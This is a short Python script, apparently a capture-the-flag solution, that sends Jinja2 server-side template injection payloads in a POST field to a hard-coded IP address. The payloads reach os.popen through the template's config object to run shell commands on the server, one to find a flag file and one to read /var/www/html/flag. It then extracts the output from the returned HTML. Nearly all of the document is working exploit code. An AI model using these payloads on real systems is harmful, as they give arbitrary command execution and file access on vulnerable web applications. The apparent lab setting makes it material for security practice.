import requests
import re

URL="http://206.189.236.145:5000/"

# this payload taken from: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2
payload = "{{ config.__class__.__init__.__globals__['os'].popen('find / -name flag ').read() }}"
r = requests.post(URL, data={
    "name": payload
})
print(re.findall('<h1 class="container my-3">.*', r.text))

payload = "{{ config.__class__.__init__.__globals__['os'].popen('cat /var/www/html/flag').read() }}"
r = requests.post(URL, data={
    "name": payload
})
print(re.findall('<h1 class="container my-3">.*', r.text))